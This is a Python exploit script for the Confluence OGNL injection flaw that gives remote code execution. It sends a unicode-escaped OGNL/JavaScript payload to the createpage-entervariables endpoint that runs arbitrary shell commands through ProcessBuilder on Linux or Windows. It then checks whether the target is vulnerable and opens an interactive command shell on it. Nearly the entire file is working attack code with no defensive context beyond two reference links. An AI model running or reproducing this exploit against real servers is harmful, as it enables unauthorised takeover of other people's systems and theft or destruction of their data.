#!/usr/bin/python3
# usage: python3 file.py SITE
# Ref: https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md
# Ref: https://www.exploit-db.com/exploits/50243
import os
import sys
import random
import string
import warnings
import requests
import readline
from bs4 import BeautifulSoup
from urllib3.exceptions import InsecureRequestWarning

warnings.simplefilter('ignore', InsecureRequestWarning)

readline.parse_and_bind('tab: complete')

pwd = None

def parseCommand(cmd: str) -> list:
    return cmd.split(' ', 2)

def encUnicode(string: str) -> str:
    newset = string
    if '!' in string: newset=newset.replace('!', '\\u0021')
    if '"' in string: newset=newset.replace('"', '\\u0022')
    if '#' in string: newset=newset.replace('#', '\\u0023')
    if '$' in string: newset=newset.replace('$', '\\u0024')
    if '%' in string: newset=newset.replace('%', '\\u0025')
    if '&' in string: newset=newset.replace('&', '\\u0026')
    if ':' in string: newset=newset.replace(':', '\\u003A')
    if ';' in string: newset=newset.replace(';', '\\u003B')
    if '>' in string: newset=newset.replace('>', '\\u003E')
    if '<' in string: newset=newset.replace('<', '\\u003C')
    return newset

def makePayload(command: str) -> dict:
    cmd = encUnicode(command)
    data = {"queryString": "wibuheker\\u0027+{Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var isWin = java.lang.System.getProperty(\\u0022os.name\\u0022).toLowerCase().contains(\\u0022win\\u0022); var cmd = new java.lang.String(\\u0022"+cmd+"\\u0022);var p = new java.lang.ProcessBuilder(); if(isWin){p.command(\\u0022cmd.exe\\u0022, \\u0022/c\\u0022, cmd); } else{p.command(\\u0022bash\\u0022, \\u0022-c\\u0022, cmd); }p.redirectErrorStream(true); var process= p.start(); var inputStreamReader = new java.io.InputStreamReader(process.getInputStream()); var bufferedReader = new java.io.BufferedReader(inputStreamReader); var line = \\u0022\\u0022; var output = \\u0022\\u0022; while((line = bufferedReader.readLine()) != null){output = output + line + java.lang.Character.toString(10); }\\u0027)}+\\u0027"}
    return data

def parseResponse(text: str) -> any:
    soup = BeautifulSoup(text, 'html.parser')
    commandResponse = soup.find('input', {'name': 'queryString', 'type': 'hidden'})
    if commandResponse is None:
        return None
    commandResponse = commandResponse.get('value')
    if not commandResponse:
        return None
    commandResponse = commandResponse.replace('wibuheker[', '')
    commandResponse = commandResponse.replace(']', '')
    return commandResponse

def make_request(url: str, command: str) -> str:
    cmd = makePayload(command)
    sess = requests.Session()
    sess.headers = {
        'User-Agent': 'Mozilla',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept-Encoding': 'gzip, deflate'
    }
    r = sess.post(url, data=cmd, verify=False)
    return parseResponse(r.text)

def check_vuln(url: str) -> bool:
    rand_str = ''.join(random.choice(string.ascii_lowercase) for i in range(14))
    command = f'echo {rand_str}'
    result = make_request(url, command)
    if result is None: return False
    if rand_str in result: return True
    return False

def exploit(url: str):
    global pwd
    get_cwd = make_request(url, 'pwd')
    if get_cwd:
        pwd = get_cwd.rstrip()
    while True:
        command = input(f'wibu@heker.me:{pwd}$ ')
        if 'cd' in command:
            cd = parseCommand(command)[1].rstrip()
            if '..' in cd:
                pwd = os.path.join(pwd, cd)
                pwd = os.path.realpath(pwd)
            else:
                if cd.startswith('/'):pwd = cd
                else:
                    pwd = os.path.join(pwd, cd)
                    pwd = os.path.realpath(pwd)
        elif 'exit' in command: break
        else:
            result = make_request(url, f'cd {pwd} && {command}')
            if result is None: print('Empty Response.')
            else: print(result)

def run():
    print('Checking Vulnerability...')
    url = sys.argv[1]
    if url.endswith('/'):
        url = url[:-1]
    url = f'{url}/pages/createpage-entervariables.action?SpaceKey=x'
    isVuln = check_vuln(url)
    if not isVuln:
        print('Not Vulnerable.')
        sys.exit(0)
    exploit(url)

if __name__ == '__main__':
    run()
